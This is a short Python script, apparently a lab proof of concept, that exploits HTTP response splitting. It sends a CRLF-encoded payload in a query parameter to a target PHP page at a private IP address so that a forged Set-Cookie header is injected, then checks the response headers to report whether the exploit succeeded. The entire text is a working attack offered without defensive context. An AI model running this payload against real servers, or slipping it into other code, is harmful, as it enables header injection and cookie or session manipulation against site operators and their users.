import requests

# Target server details
victim_url = "http://192.168.64.5/vulnerable.php"

# Malicious payload for HTTP response splitting
payload = "test%0D%0ASet-Cookie:%20malicious_cookie=value"

# Full URL with the payload
exploit_url = f"{victim_url}?input={payload}"

print(f"[*] Sending exploit to {exploit_url}")

# Sending the malicious request
try:
    response = requests.get(exploit_url)

    # Print response status and headers
    print("\n[*] Response Status Code:", response.status_code)
    print("[*] Response Headers:")
    for header, value in response.headers.items():
        print(f"  {header}: {value}")

    # Check if the malicious cookie is injected
    if "Set-Cookie" in response.headers:
        print("\n[+] Exploit successful! Malicious cookie injected:")
        print(f"  {response.headers['Set-Cookie']}")
    else:
        print("\n[-] Exploit failed or target is not vulnerable.")

except Exception as e:
    print(f"Error: {e}")
